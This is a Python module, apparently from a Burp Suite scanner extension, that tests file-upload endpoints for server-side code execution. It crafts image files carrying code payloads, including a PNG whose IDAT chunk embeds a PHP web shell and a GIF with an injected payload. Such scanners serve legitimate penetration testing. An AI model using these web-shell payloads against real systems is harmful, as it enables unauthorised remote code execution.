import cgi
from misc.BackdooredFile import BackdooredFile
from misc.Constants import Constants
from misc.CustomScanIssue import CustomScanIssue
from misc.Downloader import DownloadMatcher
from misc.Send import Send


class attacks():
    def __init__(self, callbacks, dl_matchers, burp_extender):
        self.callbacks = callbacks 
        self.dl_matchers = dl_matchers
        self.sender = Send(callbacks, burp_extender)

    def _servercode_rce_backdoored_file(self, injector, payload_func, param_func, globalOptionsPanel, formats=None, ):
        bi = BackdooredFile(injector.opts.get_enabled_file_formats(), globalOptionsPanel.image_exiftool)
        size = (injector.opts.image_width, injector.opts.image_height)
        for payload, expect, name, ext, content in bi.get_files(size, payload_func, formats):
            lang, types, content = param_func(ext, BackdooredFile.EXTENSION_TO_MIME[ext], content)
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BfRce" + name + lang
            # content_start = content[:content.index(payload)]
            # content_end = content[content.index(payload)+len(payload):]
            title = lang + " code injection"  # via " + ext[1:].upper() + " Metadata "
            desc = 'Remote command execution through {} payload in Metadata of type {}. The server replaced the code {} inside ' \
                   'the uploaded file with {} only, meaning that {} code ' \
                   'execution is possible.'.format(lang, name, cgi.escape(payload), expect, lang)
            issue = CustomScanIssue(injector.get_brr(), self.callbacks, title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
            self.sender.simple(injector, types, basename, content, redownload=True)


    def _servercode_rce_png_idatchunk_phponly(self, injector, types):
        if injector.opts.file_formats['png'].isSelected():
            # PNG with payload in idat chunk that is PHP code taken from https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
            # TODO feature: add other variations of this idatchunk trick. Currently what we do here is simply take the png that has already the idat chunk.
            # We simply assume that a server that is stripping *all* metadata cannot strip an idatchunk as it is part of the image data (obviously)
            # However, we could do other variations of the not-yet-deflated images, that when transformed with imagecopyresize or imagecopyresample
            # would even survive that. When implementing that, a generic approach which allows resizing first to sizes self._image_formating_width,
            # self._image_formating_height etc.
            lang = "PHP"
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "IdatchunkPng" + lang
            content_start = "\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00 \x00\x00\x00 \x08\x02\x00\x00\x00\xfc\x18\xed\xa3\x00\x00\x00\tpHYs\x00\x00\x0e\xc4\x00\x00\x0e\xc4\x01\x95+\x0e\x1b\x00\x00\x00`IDATH\x89c\\"
            content_end = "X\x80\x81\x81\xc1s^7\x93\xfc\x8f\x8b\xdb~_\xd3}\xaa'\xf7\xf1\xe3\xc9\xbf_\xef\x06|\xb200c\xd9\xb9g\xfd\xd9=\x1b\xce2\x8c\x82Q0\nF\xc1(\x18\x05\xa3`\x14\x8c\x82Q0\n\x86\r\x00\x00\x81\xb2\x1b\x02\x07x\r\x0c\x00\x00\x00\x00IEND\xaeB`\x82"
            # TODO feature: here we use a modified payload that is also an idat chunk
            code = "<?=$_GET[0]($_POST[1]);?>"
            content = content_start + code + content_end
            # we expect the server to simply execute "code", but as the parameters in $_GET and $_POST do not make sense
            # it will fail and simply cut off the image right before "code". In practice this means an HTTP 500
            # is returned and the body only includes content_start. Therefore this tests checks if "content_start"
            # is in the body and that "code" is for sure not in the body
            expected_download_content = content_start
            title = lang + " code injection" # via PNG IDAT "
            desc = 'Remote command execution through {} payload in IDAT chunks, payload from https://www.idontplaydarts' \
                   '.com/2012/06/encoding-web-shells-in-png-idat-chunks/ . The server probably tried to execute the code' \
                   ' {} inside the uploaded image but failed, meaning that {} code execution seems possible. Usually ' \
                   'the server will respond with only the start of the file which has length {} and cut off the rest. ' \
                   'Also, it usually responds with an HTTP 500 error.'.format(lang, cgi.escape(code), lang, str(len(content_start)))
            issue = CustomScanIssue(injector.get_brr(), self.callbacks, title, desc, "Tentative", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content, not_in_filecontent=code))
            self.sender.simple(injector, types, basename, content, redownload=True)

    def _servercode_rce_simple(self, injector, payload_func, param_func):
        payload, expect = payload_func()
        lang, types, content = param_func(None, None, payload)
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Simple" + lang
        title = lang + " code injection" # via simple file upload"
        desc = 'Remote command execution through {} payload in a normal {} file. The server replaced the code {} inside ' \
               'the uploaded file with {} only, meaning that {} code ' \
               'execution is possible.'.format(lang, lang, cgi.escape(payload), expect, lang)
        issue = CustomScanIssue(injector.get_brr(), self.callbacks, title, desc, "Certain", "High")
        self.dl_matchers.add(DownloadMatcher(issue, filecontent=expect))
        self.sender.simple(injector, types, basename, content, redownload=True)

        
    def _servercode_rce_gif_content(self, injector, lang, payload_exact_13_len, types, expect="AB"):
        if injector.opts.file_formats['gif'].isSelected():
            # TODO: PHP not working, simply returns payload <?echo "AB"?> inside GIF, at least on my test server... I guess
            # the PHP parser already stopped looking for <? when it reaches the payload as too much garbage...
            # However, it *does* get properly detected for JSP tomcat servers where it is injected with ${}!
            # TODO feature: defining expect as "AB" is pretty stupid as that is not really unique....
            # GIF with payload not in exif but in file content that survives PHP's getimagesize() and imagecreatefromgif()
            # https://www.secgeek.net/bookfresh-vulnerability/#comment-331
            basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "InContentGif" + lang
            start = 'R0lGODlh1wBUAPf/APz9/ubr9Jx5G+ru9uTq9LikaP3opuXNiWB8hP378fb4++zw9+/y+OrUmenXp+Tp882tXWqFi9zCeNa5bP7yyfr6/eHI' \
                    'gcetZ09mbfDz+ZOXeN7EfExiaNbDh9m8cVF8ieLo8fv8/fDZm7Cztff4/P3ik+js9fDy+ODGfq6qhunRjP767OLJg9S3afL0+cyxabOaWv700' \
                    'f722Obq9KKacFlyelB6h/3+/omWhOjctdq+dNCxYdO6dMe6haWCJ/TpzNvAdqmKNl96gvHepvP1+jxlaNjc5P7uusq0clt1fFZudffu1fz8/V' \
                    'JpcOLm7EleZFx2fvHhsfP2+vv37P7+9/755PHlxNK0ZauTVrqaQ7yfVXyBbuDHgNm3WOju9mlzaPv1493i6eK1U+ziw3SJgvHXkOvw9vPkueT' \
                    'Mh6iMRP7ssbOSOl55gOvhvMaWMenu9eS8Z7a5wN+rQerNhMHFzFF5hsjM0te6bujt9fvuxaONUjBRVOPKhdS9evfpvM3R1//++/jtzNLX4ObJ' \
                    'fv39/vj5/MCkXL3Bx9WqTU94hevv9sSkUuPp89GyY+7y9+vu9NPSyNm/ePbqw62SSvH0+Z+CNubPi93Del2BhcaoXfHmyPL1+e7x+Ozn0V14f' \
                    '/f5++jDbdvCfYqKb7CNMu7x92F8gv733uvLikdbYNXAgODCc8rFsurKevjx3c2tVZ+GQ+Dl72SAh1dxePDy9+PLhVpnYV55gZ6gglRtdFx4gN' \
                    '/Aa1l/hti7cH+QgubKglN9iFp0e/fmsd7JiPr7/V5xcf379vf17uHMi+3w9V11fNO1Z1tyef7+//T2+v7+/vn6/Pj6/PX3+/7///////X3+vb' \
                    '3+/T3+/n7/e3x91dwd/T3+lRsc/n6/f7//v/+/////vr7/Pj6/eTp9PT2+//+/u3y9/X2+s+wYO3y+PX2+2F9hc+vXzheYdC3ceXRmefs9fb3' \
                    '/MioV/fouPXx5Vd9h199hrWEJP7wwd29Z+fr8F97gr+tc+nIeFlwdVVvd////yH5BAEAAP8ALAAAAADXAFQAAAj/ANUJHEiw4MBYEQwqXMiwo' \
                    'UF6HyJKnEixosWJNj7YsPGvo8ePIEOKHEmypMmTKFOKdGgQYSwELAcimEmzps2bC+v9usiz50WOKoMKHUq0aMiYBxPGvMm0adOBpXbt/DDVp1' \
                    'WMGYEa3cq1a1GkAiPEaugUgb6zaNOqPetUHb2qV+NS1Oq1rt27Hpe6ZMh07VkhgAMLFlIqFplevXAoVoyYTCy4cq9u1Ii3suWtSMUq7Kt2sBB' \
                    'boEPbOnwrRY8OwiypVn3ggLAOPVLcIhMhctzJl3PrRhkzglKCnP8GDs2mOBtPyCPgMH1AhYrVq1u3RnOM1rFjwmL3qm2bZ9bd4MN//2TpGybw' \
                    'mmkFgy6OvD0UKGRMO3cO3ZL0+2jy09pPiw+tHrNR1d1F4hW4m0O+FWRTeoCt59577yXRSwodWPJcfQfYZ990+aFBi4f78cEHC7QIk0oKZAxok' \
                    'YEsWtZQeTItKNxnxyEHIYRJxNcBffWxhl+H+oXIwogsFGmBBancEgFkttHV4pNcLYTQb+rIqM9wNd4IRRJcQqFBKj1G9+MBQfbXX5FoHmkBF2' \
                    'r2gAOTkUEpZ5QtaRbjTAzakiWOSQADTA3xZdjjfdIBqZ9/Iqap5ppcNIoCCqGksKSKc1ZKVJ1j3WmWcHraiKOfNdQAjCg9hLnhj2UKmSYLRzb' \
                    'q6qOPbv9wSQ+9wGmVpbiqVNBeAlnZ4HE39vlnqMtosCN0hJJJZochikhkmmy+CusG1FY7qwZ1JKKtDXVcleu3JhHEa5XoXUmjp1sOW4Mssixz' \
                    'S2piospsf86uuqijsKJQLbWXXCLBJTzcAtFG2hacSEYVgavwSmHZSS6enAIbIajrZpNNP7eggay8QdaLppGt4jvtvpfI6q8EEvRxC5M2GFzHZ' \
                    'B8sLHNe6iSoKVoNottnqLJYrIQSGfuIH5kf8kcvC66uscaajOYbq7Umn4yyBED0oYGtGrW87cwzT6kgxOba4unO6/bszzZNiCJMssqCaHS9XG' \
                    'wQygUCCDCBo1w8vW/U/07/TTUQgPeBA8I9ccu1zA73Cva5nkzMcza4YIABB1t0kCyzINZLpAWh9NGOD1pcEES+e/Pbr9R/Aw64Djq0k6K3hyu' \
                    'c6c3mSpxuDdmgzQEGTTRBTA+FLpuqx0ai0AcSMAgARwMC7KC3tf36jbLqqrPO+j6YwB77t19DDJjtwMiCNu9NbGN+EykUOi9/iSq6Zijt7COA' \
                    'G6cE44oPe58uferVW2+9Byu71fa4d55N5ew9wFBCEzBgPn8o4XxpM5Tb6PUsVoVsA8ebhADk0ABJlMEHizAd6qZGPR0AwX8eSKEKe0E4Ag0wV' \
                    'wXkVOPEVz5/mA0XEPzd+ihYwVa1agORaEcB/+YnhjMEogwt8MHpUAcE/vnvfyr0AC94gT2fvBCGivOeLWrgjyb4IxuPUwIO0bZAGoDIQ4iqoA' \
                    'VdlTdI9eECafCBGMTwg1aIQASjyMIIqbe6J0YxhVO8wx2u1pMr4upOZ8mFLHCBixpw6U89EyMZF/iFVITITB8DWbTwBUQkDBERYgDFEsAwBBG' \
                    'EQgAeIGH//PjHKQbyDhNAAndcaMg5ZVEIUPBHIz9VMUn2boEYoMEBKPgxNTWqadMKBQ9ENwo4wGEOrZhCFKIwhCysgX8nZGUUXSlIWMJyAoSk' \
                    'ZS2h1Ct9AMOGSRCb4244SckRIxWIKua9RKYvWR0veboABSgaAP+GKVghCjlwhwBa0EdtAtKVvOjmBBY6gRYgIRY8GactaQIMW5wLgaHKhi7bO' \
                    'TkNZNICa9wk6fgVxH34IAv84AcrhgCGBPygDW2IghZGkU0UbpObCmVoQxuqgYhKlJzeE4LEksAzB0JQchioxT7kycY2jqxaKbtA8uZAVRWcYQ' \
                    'rFeClMoyAACEDxpq/UqU5bQNYWFGAX4vypgWjyF3XeLpJHnRwHviAM9yHzeaaLhCd9EA/nlKGDWP1BDnIwhjG8wAc6aOUru/lNhpb1sS94XcL' \
                    'U2qKgSmxYGsVh7yTHgc7SwIIhc1rpTAaEZcLABw0owx2HEIgEFEMTDnAAYa0ggHj/3JSxjR3rY1ugjN72dEWUZZEWG/dWo26WsxxQqjDYKFqS' \
                    'LVECOvCkAPoggiFY9wytKMYUYCvbNnSiAwLQAUIFOYHcLnS3Ze1tb88K3OAWSB9m+R5xIZmNB5IRuU94Jz3rmb/ntk4LAghCMIYwzTP8AAxUm' \
                    'MIYHOAOB3h3CaOoLWPFel70qre3V7jCBSA6WfeKRwhtJe7OZLHR43aWA0/YgtP461ypRcIDhvCBDzoQgzyc4QySkMQSpgAIfzLYwZ1YQgzAy1' \
                    'cKoze96s2wklnYYQ+Dhw1/uWwvz4dcFD9BA04t3XOpFgkdXCDCL/ADBWJgihhIIhCjnIIzErBgdxC2/xUykEGNXyCAUZyjwha+sJIz3IhG/JY' \
                    'iThYPFK7UqeJqFpgnfgIHaDCI/PFtal1uR4S1EIx7jFkGpqhCFVoRzQQAIquDzcE8NC1nCtwjGABeQyN2q2dl7JnPfaYBWgEdaPAkg9Dzzah9' \
                    'Ed3ZJzxBqS3WH5c90I41CCALIlDDEShAAUxXYQUJWAEYVlAMZxSjFWPIwRKiXQVTlPoeahBBFgSgamXwFsOufnWf112A7NG61rpJhnwNfV+5W' \
                    'rkWSNBXyYQ9PR3wINWDMICyLR0DGTw7AVSgAsKpQA4mzKMT8yhGArj97SOowQC+MHYWePtqWK+7ETtoRLubDG/LLOMzIv/OaImr7OtfR2KJTI' \
                    'wELwwhAB/oogQGEPgR7lHwgyecCoAI+jeYYAxj/FzhK6hCqS2e8xLoQsaLUPfHQ76Dql/A3RMpuW5O7lb6PtDEvfZ1LWS1PyBEggeZ8IEAulC' \
                    'Ctit7zJmGdsKDDohv2H0ahCjGN+gOCKST2tRHaHoJulDzeHwc5FVP/DnOsY7HvFvrlTk5sEZcYl5b+df7i4TMJS0AV+Cc55qGdjGATne7m34a' \
                    'qE+96U1PdypIPOkyoEDgS+CKOq878TtYvO7PweGsQ97k7LldZsdn75ajohZMFG87RCeAFxhg2c5eAbShnYApWP/6U5j4pyeO/exXv/rST3r/m' \
                    'cFdAgjU+Ry4z/3u19F4yPze5G4lKu6+bvmWY76J1VtmAWCgh7qxHedvRwGBgGY/UIA/oAlWYAWaMAXTkFUImICaEIEFOIB5kAeBZwBtR3ggtA' \
                    '6NsHu6tw6Mdw6u0HsS8X6R13VTBnZWhgrHx0dAQGwXsH9YoAevUHM3l3PKdgTycGPTlAOx5QCtAAgNCFsN0GANEFvWZV3BIHAY+HQCMAlaAAH' \
                    'op34fyH7sBwGY4H4meBfLgIIkdmjF52ssWAvtUFA6cAcvEIMwgAUzWAl1FnADp4PT5AAi4A7uEAhC91pFGDcsoDENsFpLaACDYGxBAANakAkQ' \
                    'sA47AIKMZ4VX/wgBmYB1JbiFdrEMkwdJKxeGTzCG++BHvDABy5cJMqgHeuCGyHYEy5YHfnAGURBbSzB331AMVtAAEiAiG8ACFrJaBlAG41YJh' \
                    'mgIiOiIwrgOEFCMEMBej0eJXAEMl4g7mZhoYsiCBcA6HpBYKnQH7ZCG+7eGNKh2lGZpqsiKpjBxQBeLmtAAl4APdjgIzXFH4iYAlQCFh1iMVt' \
                    'iIxkiPxegKskZyymgUSdCM9UVlYciCLEgDfyRFgTQBL6CNaziDNdh8YpYHkiAD0rdw5tgAKKAKqvCHaOAcmVBzk2CIiCiFjUiMiXiPKEkDv6C' \
                    'F/cgVUDB5ulZv0EiQqCAKihVWLf+QhpmgBdxIg3VDYzFQcHEHdFmFkfqykfLAA3WTBoYYD8E4jCgZlRAgCi0UES3ZFZ7ABhESkyoYjSz4BRMg' \
                    'RQipUN/EW2loCDw5gz4ZBBUYCBSwBKbAYwkwi6wyCCjAD0EgAEypBcBIj8IolVJJBjsBF1fJFWPDlQtUBIq5mIzZmI75mOwQmXswmZMpAKkgD' \
                    '36QY4EABhI3i77gC4MwCB+5B5HJDo95mqiZmqq5mqzZmq75mrC5mvGHmBhQBIxwm7iZm7q5m7oJArAAC0YgCH9AB3EwArfgAwQWDMFwBkvQmQ' \
                    '0wBwcwB4MgACMgCEbwmyDAm9q5ndzZnd75neAZnuL/OZ7cWQSzOX/3VQQEQAAP8ACMwJ4EwAgPEJ/vyZ7zKZ/0KZ/zGZ+/aQR/cAjF+QoQUF3' \
                    'WFQjZdwbzMQeLkAZGEAYgkJ3uuZ742Z73SZ/iQJ8PcKEReqHyeZsSSp/xGaLr6Z7z2Z7v+Z73WZ8RiqGMcKEimqH1OaL7OaPrGaIm2qEtKqEV' \
                    'mps1CqIeup8nyp4daqP1eZvmqZVbQpvq6aI9up5M2qQySgAaOqKMAJz/aZw+oAJloFpXNQVnUAbOMQcCsAqwEKM1aqY9mqFPCp/7OaJpCqVSC' \
                    'qVtuqZs2qRtCqV0WqMueqc9Kg7zuadwGqfw6aSBeqdTyp4uWgRC1Tjy/xeQm6WeBBAAARCpkwqllQqnkyqpPQoLgmAHxakHWVBVLCVNW8qLMA' \
                    'AL63mplBqokcqqrtqjqgqrrwqrmRqosVqjmtqqqTqrrVqrs5qpt+qqigqQK1cEwNqrwDoDlFqrkqqsq1qpAQACYfCfxSkAusAKrFAG0TQEWzq' \
                    'dkAACy9qsksqsATAD4yqu55qu44qs4aqp6tquwOqu6rquBGCu7kqp9pqq5Wqv8dqv6aqs5xqukcqvuwqt6wqsw8qomKhZtXmu7yCpDzuvEJuu' \
                    'EVuxkwqcnjoCejAK+jQHS1AF3FoGa1AAsBAAEWuyEPuwJ5uyJnuyK2uxLfsOMjux46qyLP+Lsi2LszSrsjYrszYbsxPrsyvrsDS7szUrsTmrr' \
                    'hVrsQ+bsPSWmEIbtVI7tVTrsw8QBoJAnCMgAIgAB6BwYCVQBqogAEYAAlUbtTF7tmq7tjPLtm4rtWn7tm+bs1MbtzyLtorqhcbVBEUgs3iAB+' \
                    '/wt4H7t4RLuCYAuH97uIkbuD6LB9FqBHZwCCNAA/YwR2cABm03CvtgtopbuHiguKALuIdrAu/QuYDLuJ/rt4YbuIqruqPruYQ7uKZruKT7ubY' \
                    '7uLaLuKmbu7Cru4aLuK2buqQru7ubu65burG7uKWbt7kGV71TBHjgBXjwBl7wBtErvdb7t9lLuNvrBd77t9X/q70B4ARZW61uIAYOEAMlgA8+' \
                    'AAviIL3gG7/ga73067nd27vWC7/ce7/bq72Ei73UC7vSG77R+7+eC7/Zm78J7L/cC7v5y8D/27/928DfK7/Ty7xbiZ5oUwRv0MEdPAAD8MFvA' \
                    'MIg7MEmXMIhHMIeHMJ4IK3UegsbdAr3UAI+0AMPML0kvMIj/MEovMMjrMIq7MMpvMJDDMQ/HMQ8bMIirMRFrMMnnMI9vMNBjMRKvMQl7MM8fM' \
                    'VYHMVY/MNFcCXN+IUbrAgkrAhmbMYgTMZnvMZpvMZnPABqrAh44ARGoLU+YA+gcARdUAkP8A5uHMdv7MZl/Md/DMeBDMeGTMaI/0zIaKzGg6z' \
                    'IjYzGg7zIgVzIjCzIb2zIbVzJjxzJmbzGX4xyGEViX1cEC7DGC2AGqawIp3zGZmAGrgzLr+zGC7DKZjy+wxkHKcC1JTCmfgzLijDLfyzLqEzM' \
                    'wczKwSzLwMzKtazKqpzMwdzKy8zKqnzKzZzMsCzNZ3zKr7zKryzMspzKyyzM26zMrZzM3jzL2UzM3ZzKtezK4rzMpxzK5+mopowNtZzPC4DP+' \
                    '4zP/KzP/wzQ/ZzPAwACkAuglWAPL5AG+YAM+RzQ+rzPEQ3RtczP2EDREV3REp3RHH3RAG3RGD3QG23RGv3Q/nzRJ/3P/izQHj3RD53RKx3Q2E' \
                    'DPYf+8UUWA0hddDijtCDmN0+iADaRw0ZyA0kHtCD+t0zwN1I9AvsS5ywIACY8A1KTACVSN0zkd1FMt1UF90aTQ1Ty91VaN1UJ90Ue91UMN1I4' \
                    'w1KTw01LN1VNdDlmt1VzNCViN1We91iit02CNDWdd1Wet0+gw1HeN06TgCF+NDXBN2OjQ1VZN11Y901HWvEZVBIZt2Axg2ZxQ2Zp92ZftCJed' \
                    '2ZzNCQzAAIU92oaNDfkwrYdAB1gAAyaADJ4d22nN2bPt2Z0N2ppt2Z092qBt2rJt2bE92qYt3J3926Kt2wwg2sVt2Li92Zzt28tN29Kd259d2' \
                    'cMt3L9t3bb93MNt24b//cW4lsH1hQtFwAAZcN7ofd7mjd4nsN4ZcAInkAHCnd7o7d7xjQx0/Ad/YAQNLd/qfd7wHd/0Xd/+/d7pvd7tXeD03d' \
                    '7uTd/mHd8MIOD+bd72PeAFTuH/7eD/HeHyjeEPPuDr3eASHuLvLeEHnuAA/uARXgTxVWiUR96UQAkZEOPoTeMyLuMznuM6HuM3zuP0LeNLbQR' \
                    'G4ASPMAs97uM5buMzjuM1buM87uNPfuRRTuNJft443uNJLuVHvuROruQ3vuTpHeVWLuU6XuNc3uVPXuZQHuUsHmIYNX9FsAmU4AKbIOcu4AIx' \
                    'jud4XuebQOdy/ud0HuiUUOeD3ueGPguP/5AP+VDkfI7ng07nc27ngz7ndy7nk77nkH7nes7nPM7plU7pe+7pde7nhX7phc7now7olg7pp+7nf' \
                    't7nPE7qjU7oo67pqD7pfz7rkc7qtd7oc97muKaw6+IPcb4JRGDsmyAFREAEyn7syy4Fdc7szr7szM7n1Z7s0M7sLjAL3B7py27sxw7tyU7t4C' \
                    '4FzU7tzG7uyr7u0Z7u1J7t6/7t1Z7t5E7vyg7uyC7t1s7nzd7v0q7vx47s7a7v+X7uyY7v4w7wxm7u157tC1/n/c7nLG5AUg=='
            start = start.decode("base64")
            end = '8RgvBc2gDSEP8hoP8iT/8Rxf8uYe8tZQ8h7f8S6/8eP/sPIkL/LaQPMhPw4i3/Egrw03X/I7b/JSsPMeL/LmfvNSwPFEP/Qqj/HjkPIwf/Ib//JF' \
                  'n/LWQPI1P/VE//Iz7/E93ww6n/RND/JQH/MvP/EhJuyyUATUQA3aEA3mYA7W8PbR0AzREA3WEA10P/fjQA16Tw3W0PbWkA54n/dtHw1uH/h3//Z' \
                  'tz/h6bw1y//aQf/d4//bm0PfjkPeI3/Zy3wzWYPja0PbpEPiHb/dwrw2kH/h5b/ibP/hwr/mC7/PpYA6V7/eLv/mID/uSD/h3z/p6z/htH/y8f/' \
                  'e2j/g+7/efX/iA7/qUD/jLz/uKTw0TH1+LmsFFoADRoAAKUA3c/6/93r/9218N2D/+2C/+2a/94o/+3t/96y/+6f/966/+8J/979/+2h8N9W/+C' \
                  'gAP4Q8QCgQOJFhNQTWEAg0SVHiQYbRoDhk2HJiQ4sKFDDEOjNgwY8GODjNmjFYEwUl9+oTYYuMJShJgNYqQ+ESChIJPAmneVECzZ86cNml+IlrT' \
                  'pkCiP2sCrYnz502jS30SHUpVKFWcSXVODYqUadaiQZdGjYq0p9OhN4XuZLvz7E+cbsUOHBqXK9Wib9veLVtE3UkEKVe6fAmsSKFPhQpB+wQNsWL' \
                  'FjRk7VkzZMbTLiIlCpowYc+bEkT9vblw6MePFixOXzuw5dWjIpzsvnk37Mf/mx5wrf4ac2vbp1bkr+84dfDLv4LlRgw7tmHRvaH4BC2ZJOEmRZ9' \
                  'm5QQsHLfszaNy4PRu//TO3cOAxZ/dOfn37Z93Bp08PXrt39Oq9c4/vfv/n79gTz70A7UvvPfXCObC++NrbL8Dx3KMvvADh+4y+A/UbDz77+otQv' \
                  'ULIizA/AdmjkD/1susuHL/+QkklWzwhrIhrrqmAmwqu4eaaYYbhsYIKfORRR3BqvOaZYYpMssZhgqzxmR+BTLLHHcFJEspnguzxxiGBzPGZIrlp' \
                  'ckkcbexxyTFrLNLKI8Epc8phwIQSHDfZ5EZJK5tU8shr9uzxxyGLNDLLOPsEJ8gK6Dz/cssch9TRyBwPrQDKQSElMlAhoWxxOpUGgwKKIoYJocd' \
                  'RRTV11BBSLXVVUlk9M9VXUX311FbPnJXUW3E1tVZbe+3VVVhFlVVYX1W9VdZShV012VxtHZZZZZ31dVpUjR2mRRcD67QlUFUNgQkAvGWCCW+/FT' \
                  'dVctEtd1xV01U3XXjJhbdcdc+tN9526W3XXXbf3Tdcftc1t95vxyUXAHnN5ZdfgAcOIdyC55XXXYfzrRdbwLRdqaUixgUAYYPBBfdjhEsemWSUT' \
                  'xb5Y4NZBnlkmE32GGWXSVaZZphXXpnlmUv+mJCYa075ZJ93phlnnWX2eOmga+75aJNxLhrbbFOC/5GNIm4A4AZCfv6Ya0LCFnvsG7g2u2ywzQZA' \
                  'bLXL3npts8PWmuyy2V577a7JDvvuseEmmZC488477a3B3rtuwcdOXGy4Affb8bzx7trwvftGvOufKU98a8fxNnxtqqvu1Jaszw6bGcBTv4EZZ9i' \
                  'u+wZnYK8bdUJij7v11mU32/baewdcd7Z/z71sZ4YHPPbeDWcGbbSXL172sJ+3PfffVYeeeNlZP9t22JGfHvHLVz/emeXFRx7t4qPXPX3ka2ce8N' \
                  'AzFkyIIli3n3Xy7+9GGmZY76Z/8pGPf/4rXv8MaMAA8s8Z/FOgNALYjeI543//y1//FLjA4kFwgf3rxv8cmNm/CBaQggZ0oAH/h78KDrCD+YMgM' \
                  'ygoQRcKEIQPXKA0BrjBDWrQhswoYfEYaL8QcrCALhRiB3l4wRKGLlsaK4I3pvG/b3iDh/2bBuvIQUVnOHEa3vgG66TRjWl84xs2JN80yCGNaUhD' \
                  'imZ0ojf2h8Y0MnCMbVRjFKVxxTTyMI1xnMYe0ciMKzrQhl1sozfQ6A0n9q+LNnTiN6qIxi92sYqPTGM3xshDb5yRGVrsYxv/18ct9rEb5HDkFpk' \
                  'RSkOSA4yb7OMY0XjGPLqxj0fkXx8POUBGIpIZRQgIADs='
            end = end.decode("base64")
            content = start + payload_exact_13_len + end
            expected_download_content = start + expect + end
            title = lang + " code injection" # via GIF Content"
            desc = "Remote command execution through {} payload in GIF image format analogous to https://www.secgeek.net/bookfresh" \
                   "-vulnerability/#comment-331 . The server replaced the code {} inside the uploaded image with {}, meaning that " \
                   "{} code execution seems possible. This image survives PHP's getimagesize() and imagecreatefromgif(), therefore" \
                   " it is likely that in general the part where the payload was injected into the image might survive other " \
                   "conversions too.".format(lang, cgi.escape(payload_exact_13_len), expect, lang)
            issue = CustomScanIssue(injector.get_brr(), self.callbacks, title, desc, "Certain", "High")
            self.dl_matchers.add(DownloadMatcher(issue, filecontent=expected_download_content))
            self.sender.simple(injector, types, basename, content, redownload=True)
